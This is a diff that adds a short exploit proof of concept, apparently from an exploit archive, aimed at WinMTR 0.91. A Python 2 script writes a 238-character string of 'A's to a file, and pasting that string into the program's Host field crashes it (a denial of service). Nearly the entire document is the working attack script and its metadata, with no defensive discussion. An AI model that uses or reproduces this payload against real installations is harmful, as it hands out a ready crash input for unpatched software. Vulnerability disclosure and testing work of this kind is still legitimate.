@@ -1,0 +1,28 @@
+# Exploit Title: WinMTR 0.91 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-11-01
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://winmtr.net
+# Software Link: http://winmtr.net/winmtr_download/
+# Version: 0.91
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# Host: Payload
+
+#!/usr/bin/python
+    
+buffer = "A" * 238
+ 
+payload = buffer
+try:
+    f=open("exp.txt","w")
+    print "[+] Creating %s bytes evil payload." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created."
